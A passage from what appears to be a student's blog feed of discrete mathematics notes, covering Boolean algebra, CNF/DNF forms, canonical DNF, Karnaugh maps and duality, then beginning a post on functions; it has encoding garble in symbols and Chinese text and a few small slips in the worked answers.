calculations can be built entirely from these simple ones</li><li>can help identify simplifications that improve performance at the circuit level</li><li>can help identify simplifications that improve presentation at the programming level</li></ul><h2 id="The-Boolean-Algebra-mathbb-B"><a href="#The-Boolean-Algebra-mathbb-B" class="headerlink" title="The Boolean Algebra $\mathbb{B}$"></a>The Boolean Algebra $\mathbb{B}$</h2><p>Definition</p><p>The (two-element) <strong>Boolean algebra</strong> is defined to be the set $\mathbb{B}$ ={0,1}, together with the functions </p><script type="math/tex; mode=display">!: \mathbb{B} \to \mathbb{B}, \&\&: \mathbb{B}^2 â†’ \mathbb{B}, \quad and \quad ||: \mathbb{B}^2 â†’ \mathbb{B}</script><p>, defined as follows:</p><script type="math/tex; mode=display">!x = (1âˆ’x) \\x \&\&y =min\{x,y\} \\x âˆ¥ y =max\{x,y\}</script><h2 id="Alternative-notation"><a href="#Alternative-notation" class="headerlink" title="Alternative notation"></a>Alternative notation</h2><p>For $\mathbb{B}$</p><script type="math/tex; mode=display">\mathbb{B} = \{ \text{false}, \text{true} \} \quad \text{or} \quad \mathbb{B} = \{ F, T \} \quad \text{or} \quad \mathbb{B} = \{ 0, 1 \} \quad \text{or} \quad \mathbb{B} = \{ \bot, \top \}</script><p>For $!x$</p><script type="math/tex; mode=display">\overline{x} \quad !x \quad \text{or} \quad x' \quad \text{or} \quad \sim x \quad \text{or} \quad \neg x \quad \text{or} \quad \text{NOT}(x)</script><p>For $x \&amp;\&amp; y$</p><script type="math/tex; mode=display">x \land y \quad \text{or} \quad xy \quad \text{or} \quad x \wedge y \quad \text{or} \quad (x \, \text{AND} \, y)</script><p>For $x || y$</p><script type="math/tex; mode=display">x \lor y \quad \text{or} \quad x + y \quad \text{or} \quad (x \, \text{OR} \, y)</script><h2 id="Alternative-notation-1"><a href="#Alternative-notation-1" class="headerlink" title="Alternative notation"></a>Alternative notation</h2><p>Definition</p><p>The (two-element) <strong>Boolean algebra</strong> is defined to be the set $\mathbb{B}$ ={false,true}, together with the functions  $! :\mathbb{B} \to \mathbb{B}, \&amp;\&amp;: B^2 â†’B, and \quad âˆ¥: B^2 â†’B$, defined as follows:</p><div class="table-container"><table><thead><tr><th>x</th><th>!x</th></tr></thead><tbody><tr><td>false</td><td>true</td></tr><tr><td>true</td><td>false</td></tr></tbody></table></div><hr><div class="table-container"><table><thead><tr><th>x</th><th>y</th><th>x&amp;&amp;y</th></tr></thead><tbody><tr><td>false</td><td>false</td><td>false</td></tr><tr><td>false</td><td>true</td><td>false</td></tr><tr><td>true</td><td>false</td><td>false</td></tr><tr><td>true</td><td>true</td><td>true</td></tr></tbody></table></div><hr><div class="table-container"><table><thead><tr><th>x</th><th>y</th><th>x or y</th></tr></thead><tbody><tr><td>false</td><td>false</td><td>false</td></tr><tr><td>false</td><td>true</td><td>true</td></tr><tr><td>true</td><td>false</td><td>true</td></tr><tr><td>true</td><td>true</td><td>true</td></tr></tbody></table></div><h2 id="Properties-Commutativity-Associativity-Distribution-Identity-Complementation"><a href="#Properties-Commutativity-Associativity-Distribution-Identity-Complementation" class="headerlink" title="Properties:Commutativity,Associativity,Distribution,Identity,Complementation"></a>Properties:Commutativity,Associativity,Distribution,Identity,Complementation</h2><p>We observe that !, &amp;&amp;, and âˆ¥ satisfy the following:</p><p>For all $x,y,z âˆˆ \mathbb{B}$:</p><p>Commutativity</p><script type="math/tex; mode=display">x âˆ¥ y =y âˆ¥x \\x \&\&y =y \&\& x</script><p>Associativity</p><script type="math/tex; mode=display">(x âˆ¥ y) âˆ¥ z =x âˆ¥(y âˆ¥z) \\(x \&\& y) \&\&z =x \&\&(y \&\& z)</script><p>Distribution</p><script type="math/tex; mode=display">x âˆ¥ (y \&\&z) =(x âˆ¥y)\&\&(x âˆ¥ z) \\x \&\&(y âˆ¥z) =(x \&\& y)âˆ¥(x \&\& z)</script><p>Identity</p><script type="math/tex; mode=display">x âˆ¥ 0=x \\x \&\& 1=x</script><p>Complementation</p><script type="math/tex; mode=display">x âˆ¥ (!x) = 1 \\x \&\&(!x) = 0</script><h1 id="Boolean-Functions"><a href="#Boolean-Functions" class="headerlink" title="Boolean Functions"></a>Boolean Functions</h1><p>Definition</p><p>An n-<strong>ary Boolean function</strong> is a map f : $\mathbb{B}^n \to \mathbb{B}$.</p><p>Q: How many unary Boolean functions are there? How many binary functions? N-ary?</p><p>$\mathbb{B}^2 \to \mathbb{B}$, we found there are 4 possible inputs and <strong>2 possible outputs of each input</strong>, so here is $2<em>2</em>2<em>2=16$ <em>*possible outputs</em></em>. </p><p><strong>Note, the question didnot mention the specific function, so donâ€™t think 0,0-&gt;0 directly, cause maybe 0,0-&gt;1 function. Additionally, the different outputs should multiple as possible results. Just regard different combination of the outputs as a new function.</strong></p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-12-13-56-57.png" alt></p><p>4 means how many input here.</p><p>How many unary Boolean functions are there? n-ary?</p><p>unary means One-dimensional relation. So how many, itâ€™s 2+2=4 obviously.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-12-13-57-23.png" alt></p><script type="math/tex; mode=display">2^{2^{2}}=4</script><p>So n-ary is:</p><script type="math/tex; mode=display">2^{2^{n}}=</script><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>$!$ is a unary Boolean function</p><p>$\&amp;\&amp;, âˆ¥$ are binary Boolean functions</p><p>$f(x,y) =!(x \&amp;\&amp; y)$ is a binary boolean function (NAND)</p><p>$And(x_0,x_1,â€¦) = (Â·Â·Â·((x_0 \&amp;\&amp; x_1) \&amp;\&amp; x_2)Â·Â·Â·)$ is a (family) of Boolean functions</p><p>$Or(x_0,x_1,â€¦) = (Â·Â·Â·((x_0 âˆ¥ x_1) âˆ¥ x_2)Â·Â·Â·)$ is a (family) of Boolean functions</p><h2 id="Application-Adding-two-one-bit-numbers"><a href="#Application-Adding-two-one-bit-numbers" class="headerlink" title="Application: Adding two one-bit numbers"></a>Application: Adding two one-bit numbers</h2><p><strong>Question</strong>. How can we implement:</p><p>$add: \mathbb{B}^2 \to \mathbb{B}^2$</p><p>defined as</p><div class="table-container"><table><thead><tr><th>x</th><th>y</th><th>add(x,y)</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>00</td></tr><tr><td>0</td><td>1</td><td>01</td></tr><tr><td>1</td><td>0</td><td>01</td></tr><tr><td>1</td><td>1</td><td>10</td></tr></tbody></table></div><p>Take Notice</p><p>Observe that this is <strong>not</strong> a Boolean function. Boolean functions can output either 0 or 1 (a single bit). This function outputs 2 bits.</p><p><strong>(Short) Answer</strong>. Use two Boolean functions!</p><p>Take Notice</p><p>Digital circuits are just sequences of Boolean functions.</p><h1 id="Conjunctive-and-Disjunctive-Normal-Form"><a href="#Conjunctive-and-Disjunctive-Normal-Form" class="headerlink" title="Conjunctive and Disjunctive Normal Form"></a>Conjunctive and Disjunctive Normal Form</h1><p>Definition</p><p>A <strong>literal</strong> is a unary Boolean function</p><p>A <strong>minterm</strong> is a Boolean function of the form $And(l_1(x_1),l_2(x_2),â€¦,l_n(x_n))$ where the $l_i$ are <strong>literals</strong></p><p>A <strong>maxterm</strong> is a Boolean function of the form $Or(l_1(x_1),l_2(x_2),â€¦,l_n(x_n))$ where the $l_i$ are <strong>literals</strong></p><p>A <strong>CNF Boolean function</strong> is a function of the form $And(m_1,m_2, â€¦)$, where the $m_i$ are <strong>maxterms</strong>.</p><p>A <strong>DNF Boolean function</strong> is a function of the form $Or(m_1,m_2, â€¦)$, where the $m_i$ are <strong>minterms</strong>.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-12-14-45-16.png" alt></p><p>Take Notice</p><p><code>CNF</code>: <strong>product</strong> of <strong>sums</strong>; <code>DNF</code>: <strong>sum</strong> of <strong>products</strong></p><p>ç§˜ç¬ˆï¼šâ€œCä¸Dæˆ–â€,â€œCä¸å°Dæˆ–å¤§â€ï¼Œâ€œmin AND, max OR, Cä¸ç§¯ï¼ŒDæˆ–å’Œâ€</p><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>Question. Are these functions in CNF? Are they in DNF?</p><script type="math/tex; mode=display">f(x,y,z) = (x \&\& (!y) \&\& z) âˆ¥ (x \&\& (!y) \&\& (!z)) = x \overline{y} z +x \overline{y} \overline{z}</script><p>DNF , but not CNF</p><script type="math/tex; mode=display">g(x,y,z) = (x âˆ¥ (!y) âˆ¥ z) \&\& (x âˆ¥ (!y) âˆ¥ (!z)) = (x +\overline{y} +z)(x +\overline{y} +\overline{z} )</script><p>CNF function, but not DNF</p><script type="math/tex; mode=display">h(x,y,z) = (x \&\& (!y) \&\& z) = x \overline{y} z</script><p><strong>both CNF and DNF</strong></p><p>Note! <strong>Paul Hunter</strong> (lecturor):</p><pre><code>Note: CNF/DNF/minterms/maxterms are only concerned with  how the formula appears as written.  You cannot &quot;change&quot; the formula (e.g. &quot;x can be regarded as x or x&quot;) and have things be meaningful.(x &amp;&amp; !y) &amp;&amp; z is:A maxtermAn OR of maxterms: because OR(m) = m, so it is equal to OR((x&amp;&amp;!y)&amp;&amp;z) - therefore it is in DNFAn AND of minterms: because x is a minterm, !y is a minterm, and z is a minterm, so it is equal to AND(x, !y, z) - therefore it is in CNFLeo Liu:I&#39;m still confused, why x, !y and z are miniterms? Because x = AND(x)? So x can be considered as literal (x), miniterm (AND(x)), and maxterm (OR(x))? Paul Hunter:Yes, that&#39;s correct.AND and OR are &quot;generalizations&quot; of &amp;&amp; and ||.&amp;&amp; and || are functions that take two inputs, AND and OR are (families of) functions that take arbitrarily many inputs.</code></pre><p>My thought:</p><p><img src="/2024/10/12/Math/Boolean-logic/345.png" alt></p><script type="math/tex; mode=display">j(x, y,z) = x +y(z +x)</script><p>Neither CNF nor DNF</p><h2 id="2-Theorems"><a href="#2-Theorems" class="headerlink" title="2 Theorems"></a>2 Theorems</h2><p>Every Boolean function can be written as a function in <strong>DNF</strong>.</p><p>Every Boolean function can be written as a function in <strong>CNF</strong>.</p><h1 id="Canonical-DNF"><a href="#Canonical-DNF" class="headerlink" title="Canonical DNF"></a>Canonical DNF</h1><p>Given an n-ary Boolean function $f: \mathbb{B}^n \to \mathbb{B}$ we construct an equivalent DNF Boolean function as follows:</p><p>For each $b = (b_1, \dots, b_n) \in \mathbb{B}^n$ we define the <strong>minterm</strong></p><p>Note, $\mathbb{B}^n$ means $\mathbb{B} \times \mathbb{B} \times \mathbb{B} \times \dots$, so $b = (b_1, \dots, b_n)$ is a <strong>product (AND)</strong> of them, and the product means <strong>minterm</strong>.</p><script type="math/tex; mode=display">m_b = AND(l_1(x_1),l_2(x_2), \dots,l_n(x_n))</script><p>where</p><script type="math/tex; mode=display">l_i(x_i)=\begin{cases}  x_i \quad  if \quad b_i = 1\\  !x_i \quad  if \quad b_i = 0\end{cases}</script><p>We then define the DNF formula:</p><script type="math/tex; mode=display">f_{DNF} = \sum\limits_{f(b)=1}^{} m_b</script><p>that is, $f_{DNF}$ is the disjunction (or) over all minterms corresponding to elements $b âˆˆ \mathbb{B}$ where $f(b) = 1$.</p><p>Note, $m_b$ is the each expression of $l_i(x_i)$. Cause we want to build a DNF, so the external operation is <strong>AND()</strong>. </p><p>Note to distinguish the opposite operations. Firstly, $+$ and $\times$; Secondly, $AND()$(CNF,$\times$) and $OR()$(DNF,$+$).</p><p>â€œCä¸Dæˆ–ï¼Œä¸ä¹˜æˆ–åŠ â€</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-18-25-31.png" alt></p><h2 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h2><p>f and $f_{DNF}$ are the same function.</p><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><p>Find the canonical DNF form of each of the following expressions in variables x,y,z</p><ul><li>$xy$</li><li>$\overline{z}$</li><li>$xy + \overline{z}$</li><li>$f(x,y,z)=1$</li></ul><p>Note Jiaojiaoâ€™s handwriting below, the addtional expressions with different colors are the corresponding answers.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-18-43-46.png" alt></p><h1 id="Karnaugh-Maps"><a href="#Karnaugh-Maps" class="headerlink" title="Karnaugh Maps"></a>Karnaugh Maps</h1><p>Jiaojiao remark:â€Not very useful.â€</p><p>For up to four variables (propositional symbols) a diagrammatic method of simplification called <strong>Karnaugh maps</strong> works quite well.</p><ul><li>For every propositional function of k = 2,3,4 variables we construct a rectangular array of $2^k$ cells.</li><li>Column labels and row labels are ordered by <strong>Gray code</strong>.</li><li>Squares corresponding to the value <em>true</em> are marked with eg â€œ+â€.</li><li>We try to cover these squares with as few rectangles with sides 1 or 2 or 4 as possible.</li></ul><h2 id="proof-process-of-Karnaugh-Maps-K-Maps-for-short"><a href="#proof-process-of-Karnaugh-Maps-K-Maps-for-short" class="headerlink" title="proof process of Karnaugh Maps (K Maps for short)"></a>proof process of Karnaugh Maps (K Maps for short)</h2><p>The section would be in Chineseâ€¦ just for next quiz of Data Structure.</p><p>å¡è¯ºå›¾åªæ˜¯ä¸ºäº†è·å–ä¸€ä¸ªéšæœºDNFçš„æ–¹æ³•ã€‚</p><p>é¦–å…ˆéœ€è¦æ‰¾åˆ°å˜é‡ <code>w,x,y,z</code>,ç„¶åæˆ‘ä»¬è¿˜çŸ¥é“ <code>f(w, x, y, z)</code>, æˆ‘ä»¬å…ˆåšä¸€ä¸ª<strong>çœŸå€¼è¡¨(Truth table)</strong>,ç„¶åæˆ‘ä»¬è®©<code>f(w, x, y, z)</code>æ˜¯éšæœºçš„0æˆ–1.</p><p>å¦‚ä¸‹å›¾ï¼Œå³ä¾§çœŸå€¼è¡¨ï¼Œå¾—åˆ°å·¦ä¾§å¡è¯ºå›¾ï¼Œè¿™æ˜¯æˆ‘ä»¬çš„é¢˜ç›®ï¼Œæˆ‘ä»¬åœ¨éšæœºçœŸå€¼çš„cellä¸­æ‰“â€™+â€™</p><p><img src="/2024/10/12/Math/Boolean-logic/KMaps.jpg" alt></p><p>ç”»å¡è¯ºå›¾ï¼Œæ¯”å¦‚4å˜é‡ï¼Œå°±ç”»4x4=16çš„tableï¼Œå¦‚æœæ˜¯3å˜é‡ï¼Œå°±ç”»3x3=9çš„tableã€‚</p><p>æ³¨æ„tableçš„titleï¼Œè¡Œåˆ—çš„titleä¸€æ¬¡åªå˜ä¸€ä¸ªã€‚æ¯”å¦‚ï¼Œwx-&gt;w!x-&gt;!w!x-&gt;!wx, ä¸è¦ä¸€ä¸‹å­wx-&gt;!w!xï¼Œè¿™æ ·ä¼šé”™ã€‚</p><h2 id="Why-how-to-use-Karnaugh-Maps"><a href="#Why-how-to-use-Karnaugh-Maps" class="headerlink" title="Why, how to use Karnaugh Maps"></a>Why, how to use Karnaugh Maps</h2><p>æ¥ä¸‹æ¥è¯´å¡è¯ºå›¾èƒ½è§£å†³çš„é—®é¢˜ï¼Œä¸»è¦å°±æ˜¯ä¸ºäº†æ¶ˆé™¤å•ä¸ªmintermçš„æ— å…³å˜é‡ï¼Œè·å¾—DNFçš„æ‰€æœ‰mintermsã€‚</p><p>åœˆçš„æ—¶å€™ï¼Œä»æœ€å¤§å¾€æœ€å°åœˆï¼Œè®°å¾—æ¯è¡Œæ¯åˆ—é¦–ä½ç›¸è¿ã€‚å¦‚å›¾ï¼Œå·¦ä¸‹ä¾§ä¿©å’Œå·¦ä¸Šä¾§ä¿©æ˜¯æœ€å¤§çš„ï¼Œå› ä¸ºä¸€ä¸‹å­å 2x2çš„æ–¹çš„å››ä¸ªcellsï¼Œæ‰€ä»¥å…ˆåœˆä»–ä¿©ã€‚</p><p>ç„¶åå¼€å§‹å¾€å°åœˆï¼Œå…¨éƒ¨çš„+éƒ½è¢«åœˆå®Œåï¼Œå°±å¯ä»¥å¾—åˆ°mintermsã€‚</p><p>æ¯”å¦‚å›¾ä¸­ï¼Œæœ‰ä¸ªå­¤é›¶é›¶çš„<code>w!x!y!z</code>ï¼Œè‚¯å®šæ˜¯æœ€ååœˆï¼Œå¯æƒœæ¶ˆä¸äº†ä»»ä½•å˜é‡ï¼Œå› æ­¤è¿™ä¸ªmintermå°±æ˜¯<code>w!x!y!z</code>ã€‚</p><h2 id="how-to-correctly-circle-to-eliminate-variables"><a href="#how-to-correctly-circle-to-eliminate-variables" class="headerlink" title="how to correctly circle to eliminate variables?"></a>how to correctly circle to eliminate variables?</h2><p><img src="/2024/10/12/Math/Boolean-logic/KMap_wrong.png" alt></p><p>In the pic of the sample before mid-term test, it is wrong. Because it is not $n \times m$ cells with full $+$.</p><p><img src="/2024/10/12/Math/Boolean-logic/correct_circle_karnau.png" alt></p><p>Follow me, it is the correct way to circle them. We must circle $n \times m$ cells with fully $+$.</p><p>blue:xy</p><p>green: xz</p><p>red: yz</p><h2 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h2><p>Note, the Karnaugh Map is at the first, and then we got the Expression. Donâ€™t confuse the order of the pic and the expression.</p><p>Use $2^n$ to circle the cells, and cover all the true cells.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-17-42-36.png" alt></p><script type="math/tex; mode=display">E = (xy) \lor (\overline{x} \overline{y}) \lor (z)</script><p>Canonical form would consist of writing all cells separately (6 clauses).</p><p>For optimisation, the idea is to cover the + squares with the minimum number of rectangles. One cannot cover any empty cells.</p><ul><li>The rectangles can go â€˜around the cornerâ€™/the actual map should be seen as a torus.</li><li>Rectangles must have sides of 1, 2 or 4 squares (three adjacent cells are useless).</li></ul><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-17-44-21.png" alt></p><p>Of course it is similar to the manual calcute the 0 and 1.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-19-23-15.png" alt></p><h2 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise"></a>Exercise</h2><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-17-44-39.png" alt></p><p><img src="/2024/10/12/Math/Boolean-logic/Kmap-1.png" alt></p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-19-22-11.png" alt></p><p>The Karnaught Map just generate the expression rapidly.</p><h1 id="Boolean-Algebras"><a href="#Boolean-Algebras" class="headerlink" title="Boolean Algebras"></a>Boolean Algebras</h1><h2 id="definition"><a href="#definition" class="headerlink" title="definition"></a>definition</h2><p>A <strong>Boolean algebra</strong> is a structure $(T, \lor, \land, â€˜, 0, 1)$ where</p><ul><li>0, 1 âˆˆ T</li><li>âˆ¨,âˆ§ : T Ã—T â†’T (called <strong>join</strong> and <strong>meet</strong> respectively)</li><li>â€² : Tâ†’T (called <strong>complementation</strong>)</li></ul><h2 id="property"><a href="#property" class="headerlink" title="property"></a>property</h2><p>and the following laws hold for all x,y,z âˆˆ T:</p><p>Commutativity:</p><script type="math/tex; mode=display">x âˆ¨y =y âˆ¨x, xâˆ§y =yâˆ§x</script><p>Associativity:</p><script type="math/tex; mode=display">(x âˆ¨y)âˆ¨z =x âˆ¨(y âˆ¨z)\\(x âˆ§y)âˆ§z =x âˆ§(y âˆ§z)</script><p>Distributivity:</p><script type="math/tex; mode=display">x âˆ¨(y âˆ§z) =(x âˆ¨y)âˆ§(x âˆ¨z) \\x âˆ§(y âˆ¨z) =(x âˆ§y)âˆ¨(x âˆ§z)</script><p>Identity:</p><script type="math/tex; mode=display">x âˆ¨0=x, xâˆ§1=x</script><p>Complementation:</p><script type="math/tex; mode=display">xâˆ¨x' =1, x âˆ§x' =0</script><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>The set of subsets of a (singleton) set X = {x}:</p><ul><li>T : Pow(X)=<code>&#123;&#123;x&#125;,âˆ…&#125;</code></li><li>âˆ¨ (join) : âˆª</li><li>âˆ§ (meet) : âˆ©</li><li>â€² (complement) : $Â·^c$</li><li>0 : âˆ…</li><li>1 : $X \qquad (\mathbb{U})$</li></ul><p>The Laws of Boolean algebra follow from the Laws of Set Operations.</p><hr><p>The two element Boolean Algebra :</p><script type="math/tex; mode=display">B =(\{true,false\},âˆ¥,\&\&,!,false,true)</script><p>where !,&amp;&amp;,âˆ¥ are defined as:</p><ul><li>!true = false; !false = true,</li><li>true &amp;&amp; true = true; â€¦</li><li>true âˆ¥ true = true; â€¦</li></ul><hr><p>Cartesian products of $\mathbb{B}$, that is n-tuples of 0â€™s and 1â€™s with Boolean operations, e.g. $\mathbb{B}^4$:</p><p>join: $(1,0,0,1) âˆ¨ (1,1,0,0) = (1,1,0,1)$</p><p>meet: $(1,0,0,1) âˆ§ (1,1,0,0) = (1,0,0,0)$</p><p>complement: $(1,0,0,1)â€™ = (0,1,1,0)$</p><p>0 : $(0,0,0,0)$</p><p>1 : $(1,1,1,1)$</p><hr><p>Functions from any set $S$ to $\mathbb{B}$; that is, $\mathbb{B}^S$</p><p>If $f,g:S \to \mathbb{B}$ then</p><script type="math/tex; mode=display">(f âˆ¨g) : S â†’B \quad defined by \quad s â†’f(s)âˆ¥g(s)</script><script type="math/tex; mode=display">(f âˆ§g) : S â†’B \quad defined by \quad s â†’f(s)\&\&g(s)</script><script type="math/tex; mode=display">f' : S â†’B \quad defined by \quad sâ†’!f(s)</script><script type="math/tex; mode=display">0 : S â†’B \quad is the function \quad s â†’ 0</script><script type="math/tex; mode=display">1 : S â†’B \quad is the function \quad s â†’ 1</script><h2 id="Proofs-in-Boolean-Algebras"><a href="#Proofs-in-Boolean-Algebras" class="headerlink" title="Proofs in Boolean Algebras"></a>Proofs in Boolean Algebras</h2><p>If you can show that an identity holds using the laws of Boolean Algebra, then that identity holds <strong>in all Boolean Algebras</strong>.</p><p>Example</p><p><strong>Claim</strong>: In all Boolean Algebras</p><script type="math/tex; mode=display">x âˆ§x =x \quad \text{for all } x âˆˆ T.</script><p><strong>Proof</strong>:</p><script type="math/tex; mode=display">x = \\xâˆ§1 \quad [Identity] \\=x âˆ§(x âˆ¨x') \quad [Complement] \\=(x âˆ§x)âˆ¨(x âˆ§x') \quad [Distributivity] \\=(x âˆ§x)âˆ¨0 \quad [Complement] \\=(x âˆ§x) \quad [Identity]</script><h2 id="Duality"><a href="#Duality" class="headerlink" title="Duality"></a>Duality</h2><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p>If $E$ is an expression defined using variables $(x, y, z, etc)$, constants $(0 and 1)$, and the operations of Boolean Algebra $(âˆ§, âˆ¨, and â€˜)$ then $dual(E)$ is the expression obtained by replacing $âˆ§$ with $âˆ¨$ (and vice-versa) and $0$ with $1$ (and vice-versa).</p><h3 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h3><p>If $(T,âˆ¨,âˆ§, â€˜,0,1)$ is a Boolean Algebra, then $(T,âˆ§,âˆ¨, â€˜,1,0)$ is also a Boolean algebra, known as the <strong>dual Boolean algebra</strong>.</p><p>(Dual means the contray operation and element: âˆ¨-&gt;âˆ§; âˆ§-&gt;âˆ¨; 0-&gt;1; 1-&gt;0; )</p><h3 id="Theorem-Principle-of-duality"><a href="#Theorem-Principle-of-duality" class="headerlink" title="Theorem (Principle of duality)"></a>Theorem (Principle of duality)</h3><p>If you can show $E_1 = E_2$ using the laws of Boolean Algebra, then $dual(E_1) = dual(E_2)$.</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p>We have shown $x âˆ§x = x$.</p><p>By duality: $x âˆ¨ x = x$.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Functions</title>
      <link href="/2024/10/11/Math/Functions/"/>
      <url>/2024/10/11/Math/Functions/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#functions-recap">Functions Recap</a><ul><li><a href="#five-properties-fun-tot-inj-sur-bij">five properties fun-tot-inj-sur-bij</a></li><li><a href="#definition-of-function">Definition of function</a><ul><li><a href="#example">example</a></li></ul></li><li><a href="#injective-functions">Injective functions</a><ul><li><a href="#examples">Examples</a><ul><li><a href="#functions-that-are-injective">functions that are injective</a></li><li><a href="#functions-that-are-not-injective">functions that are not injective</a></li></ul></li></ul></li><li><a href="#surjective-functions">Surjective functions</a><ul><li><a href="#examples-1">Examples</a><ul><li><a href="#functions-that-are-surjective">functions that are surjective</a></li><li><a href="#functions-that-are-not-surjective">functions that are not surjective</a></li></ul></li></ul></li><li><a href="#bijection-functions">Bijection functions</a></li><li><a href="#functions-on-finite-sets">Functions on finite sets</a></li></ul></li><li><a href="#functional-composition">Functional Composition</a><ul><li><a href="#definition">Definition</a></li><li><a href="#iteration-of-functions">Iteration of Functions</a></li><li><a href="#exercise">exercise</a></li></ul></li><li><a href="#inverse-functions">Inverse Functions</a><ul><li><a href="#properties-of-the-inverse">Properties of the inverse</a><ul><li><a href="#exercises">Exercises</a></li></ul></li></ul></li><li><a href="#matrices">Matrices</a><ul><li><a href="#matrix-motivation">Matrix Motivation</a></li><li><a href="#basic-matrix-operations">Basic Matrix Operations</a></li><li><a href="#matrix-sum">Matrix Sum</a></li><li><a href="#scalar-product">Scalar Product</a></li><li><a href="#matrix-product">Matrix Product</a></li></ul></li><li><a href="#endbmatrix">\end{bmatrix}</a><ul><li><a href="#computer-graphics">Computer Graphics</a></li></ul></li><li><a href="#introduction-to-big-o-notation">Introduction to Big-O Notation</a><ul><li><a href="#motivation">Motivation</a><ul><li><a href="#example-algorithmic-analysis">example: Algorithmic analysis</a></li></ul></li><li><a href="#big-o-asymptotic-upper-bounds">â€œBig-Oâ€ Asymptotic Upper Bounds</a><ul><li><a href="#example-1">example</a></li></ul></li><li><a href="#properties">properties</a><ul><li><a href="#example-2">example</a></li></ul></li><li><a href="#big-omega-asymptotic-lower-bounds">â€œBig-Omegaâ€ Asymptotic Lower Bounds</a><ul><li><a href="#example-3">Example</a></li></ul></li><li><a href="#big-theta-notation">â€œBig-Thetaâ€ Notation</a><ul><li><a href="#properties-1">Properties</a></li><li><a href="#observations">Observations</a><ul><li><a href="#examples-2">Examples</a></li><li><a href="#exercises-1">Exercises</a></li></ul></li></ul></li></ul></li></ul><h1 id="Functions-Recap"><a href="#Functions-Recap" class="headerlink" title="Functions Recap"></a>Functions Recap</h1><h2 id="five-properties-fun-tot-inj-sur-bij"><a href="#five-properties-fun-tot-inj-sur-bij" class="headerlink" title="five properties fun-tot-inj-sur-bij"></a>five properties fun-tot-inj-sur-bij</h2><p><a href="https://senranja.github.io/2024/10/03/Math/relation/#definition-of-five-properties-of-binary-relations-fun-tot-inj-sur-bij-of-r-subseteq-s-times-t">binary relationâ€™s five properties: fun-tot-inj-sur-bij</a></p><h2 id="Definition-of-function"><a href="#Definition-of-function" class="headerlink" title="Definition of function"></a>Definition of function</h2><p>A function, f : S â†’ T, is a binary relation f âŠ† S Ã—T that satisfies <strong>(Fun)</strong> and <strong>(Tot)</strong>. That is, for all s âˆˆ S there is exactly one t âˆˆ T such that (s,t) âˆˆ f.</p><p>We write f(s) for the unique element related to s.</p><p>We write $T^S$ for the set of all functions from S to T.</p><p>f : S â†’T describes pairing of the sets: it means that f assigns to every element s âˆˆ S a unique element t âˆˆ T. To emphasise where a specific element is sent, we can write f : x â†’ y, which means the same as f(x) = y</p><div class="table-container"><table><thead><tr><th>Symbol</th><th>Symbol</th><th>Symbol</th><th>Description</th></tr></thead><tbody><tr><td>S</td><td>domain of f</td><td>Dom(f)</td><td>(inputs)</td></tr><tr><td>T</td><td>co-domain of f</td><td>Codom(f)</td><td>(possible outputs)</td></tr><tr><td>f(S)</td><td>image of f</td><td>Im(f)</td><td>(actual outputs)</td></tr><tr><td>S</td><td>domain of f</td><td>Dom(f)</td><td>(inputs)</td></tr></tbody></table></div><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>The <strong>identity function</strong> on S</p><script type="math/tex; mode=display">Id_S(x) = x,x âˆˆ S</script><script type="math/tex; mode=display">Dom(Id_S) = S \\Codom(Id_S) = S \\Im(Id_S) = S</script><p>Important!</p><p>The <strong>domain</strong> and <strong>co-domain</strong> are critical aspects of <strong>a function</strong>â€™s definition.</p><p>$f: \mathbb{N} \rightarrow \mathbb{Z}$ given by $f(x)=x^2$</p><p>and</p><p>$g: \mathbb{N} \rightarrow \mathbb{N}$ given by $g(x)=x^2$</p><p><strong>are different functions</strong> even though they have the same behaviour!</p><h2 id="Injective-functions"><a href="#Injective-functions" class="headerlink" title="Injective functions"></a>Injective functions</h2><p>Function $f : S â†’ T$ is called an injection or 1-1 (one-to-one) if it satisfies (Inj)</p><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><h4 id="functions-that-are-injective"><a href="#functions-that-are-injective" class="headerlink" title="functions that are injective"></a>functions that are injective</h4><p>$f : Nâ†’N$ with $f(x) â†’ x$</p><p>set complement (for a fixed universe)</p><h4 id="functions-that-are-not-injective"><a href="#functions-that-are-not-injective" class="headerlink" title="functions that are not injective"></a>functions that are not injective</h4><p>absolute value, floor, ceiling</p><p>length of a word</p><h2 id="Surjective-functions"><a href="#Surjective-functions" class="headerlink" title="Surjective functions"></a>Surjective functions</h2><p>Function $f : S â†’ T$ is called a <strong>surjection</strong> or <strong>onto</strong> if it satisfies (Sur). That is, if</p><script type="math/tex; mode=display">Im(f ) = Codom(f)</script><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><h4 id="functions-that-are-surjective"><a href="#functions-that-are-surjective" class="headerlink" title="functions that are surjective"></a>functions that are surjective</h4><p>$f : \mathbb{N} â†’ \mathbb{N} \quad with \quad f(x) â†’ x$</p><p>Floor, ceiling</p><h4 id="functions-that-are-not-surjective"><a href="#functions-that-are-not-surjective" class="headerlink" title="functions that are not surjective"></a>functions that are not surjective</h4><p>$f : \mathbb{N} â†’ \mathbb{N} \quad with \quad f(x) 